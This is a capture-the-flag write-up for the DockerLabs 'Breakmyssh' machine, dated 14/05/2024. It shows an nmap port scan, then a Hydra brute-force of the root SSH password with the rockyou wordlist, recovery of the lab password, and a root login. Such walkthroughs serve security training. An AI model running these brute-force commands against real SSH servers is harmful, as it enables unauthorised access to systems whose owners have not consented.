#Breakmyssh DockerLabs - 14/05/2024

#web - https://dockerlabs.es/#/

We start with a port scan with nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 20:55 CEST
Nmap scan report for 172.17.0.3
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds

```

We see only one ssh server with a version of OpenSSH 7.7.
We tried a brute force attack with Hydra on the user "root" to test and found that the password is "estrella".:

```shell
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3/ -t 5
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).


Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-14 21:24:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344400 login tries (l:1/p:14344400), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: root   password: estrella
```
We enter the server with these data:

```shell
└─$ ssh root@172.17.0.3
```

```shell
root@f83a9e7115cf:~# whoami
root
```
